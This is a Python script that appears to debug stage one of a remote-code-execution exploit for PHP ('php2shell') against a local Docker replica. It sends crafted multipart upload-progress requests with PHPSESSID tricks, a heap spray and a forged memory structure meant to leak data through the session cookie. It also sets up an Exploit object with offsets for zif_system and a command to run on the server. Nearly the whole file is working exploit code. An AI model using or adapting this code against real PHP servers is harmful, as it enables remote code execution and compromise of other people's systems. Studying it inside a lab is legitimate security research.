#!/usr/bin/env python3
"""Raw HTTP diagnostics for the stage-1 session mechanics on one build.

Prints the response head of every request in the stage-1 sequence so the
failure mode can be classified: no session started, session started but not
persisted, worker aborted, or cookie present but not carrying the leak.
"""
from __future__ import annotations

import argparse
import os
import re
import sys
import time

LAB = os.path.dirname(os.path.abspath(__file__))
DEV = os.path.join(LAB, "devploit-php2shell")
VENDOR = os.path.join(DEV, "vendor", "php2shell-upstream")
sys.path.insert(0, os.path.join(DEV, "tools"))

import php2shell_calibrate as C  # noqa: E402
import php2shell_matrix as M  # noqa: E402


def head(resp: bytes) -> str:
    h, _, body = resp.partition(b"\r\n\r\n")
    lines = h.decode("latin1", "replace").split("\r\n")
    keep = [ln for ln in lines if re.match(
        r"HTTP/|Set-Cookie|Content-Type|Content-Length|X-Powered|Server", ln)]
    return " | ".join(keep) + f"  [body {len(body)}B]"


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--image", required=True)
    ap.add_argument("--port", type=int, required=True)
    ap.add_argument("--name", required=True)
    ap.add_argument("--n", type=int, default=900)
    ap.add_argument("--forge-len", type=int, default=48)
    args = ap.parse_args()

    M.docker("rm", "-f", args.name)
    outdir = M.prepare_lab_out(os.path.join(M.LAB, "out", args.name))
    M.docker(
        "run", "-d", "--name", args.name,
        "-p", f"127.0.0.1:{args.port}:80",
        "-v", f"{M.LAB}/webroot:/var/www/html:ro",
        "-v", f"{M.LAB}/php.ini:/usr/local/etc/php/conf.d/zz-matrix.ini:ro",
        "-v", f"{M.LAB}/apache.conf:/etc/apache2/conf-enabled/zz-matrix.conf:ro",
        "-v", f"{outdir}:/out",
        args.image, timeout=900,
    )
    url = f"http://127.0.0.1:{args.port}/index.php"
    if not M.wait_http(url):
        raise SystemExit("replica did not answer")

    sym = C.extract_symbols(VENDOR, args.name)
    mod = C.load_upstream(VENDOR)
    t = mod.Target(url, verbose=False)
    ex = mod.Exploit(t, "id>/out/p1", zif_offset=sym["zif_system"],
                     dtor_offset=sym["zval_ptr_dtor"], profile="bookworm", verbose=False)

    print(f"\n### {args.image}  SID={mod.SID!r}")

    # 1. upload-progress request that creates the stale session state
    parts = [{"name": f"f{i:04d}"[:5], "data": b"V" * 3000} for i in range(1001)]
    parts += [{"name": "PHPSESSID", "data": b"\x00"},
              {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
              ex._file_part(), ex._big_field()]
    r1 = t.post(mod.build_multipart(parts, b"S" * 17), b"S" * 17,
                read_cap=1 << 20, timeout=90)
    print("[1] upload-progress :", head(r1))
    time.sleep(0.3)

    # 2. session-initializing follow-up (the classic rotate step)
    r2 = t.post(mod.build_multipart(
        [{"name": "PHPSESSID", "data": mod.SID},
         {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}],
        b"BNDRY12345"), b"BNDRY12345", read_cap=65536, timeout=20)
    print("[2] session-init    :", head(r2))
    time.sleep(0.5)

    # 3. spray
    parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
    parts += [{"name": "PHPSESSID", "data": b"\x00"},
              {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
              ex._file_part(), ex._big_field()]
    r3 = t.post(mod.build_multipart(parts, b"S" * 17), b"S" * 17,
                read_cap=1 << 20, timeout=90)
    print("[3] spray-priming   :", head(r3))
    time.sleep(0.3)

    # 4. leak attempt
    parts = [{"name": "PHPSESSID", "data": mod.SID},
             {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
    for i in range(args.n):
        parts.append({"name": str(1000 + i),
                      "data": (f"v{i:04d}" + "x" * 44)[:48].encode()})
    forge = bytearray(b"A" * args.forge_len)
    import struct
    struct.pack_into("<Q", forge, 0x10, 0x1000)
    forge[0x18] = ord("L")
    parts.append({"name": "1999", "data": bytes(forge)})
    r4 = t.post(mod.build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20)
    print("[4] leak attempt    :", head(r4))
    cookie = C._cookie(r4)
    print(f"[4] cookie bytes    : {len(cookie)}")
    if cookie:
        print("[4] cookie head     :", cookie[:96].hex())

    print("\n--- container error log (tail) ---")
    print(C.docker(args.name, "tail -25 /var/log/apache2/error.log 2>/dev/null || "
                               "tail -25 /usr/local/apache2/logs/error_log 2>/dev/null"))
    print("--- session files (name lengths + contents) ---")
    print(C.docker(args.name,
                   "for f in /tmp/sess_*; do "
                   "n=$(basename $f); "
                   "echo \"name_len=${#n} file=$n\"; "
                   "echo \"  content: $(head -c 200 $f | tr -d '\\000' | tr -c '[:print:]' '.')\"; "
                   "done"))
    print("--- raw response [4] ---")
    print(r4[:600])
    M.docker("rm", "-f", args.name)
    return 0


if __name__ == "__main__":
    sys.exit(main())
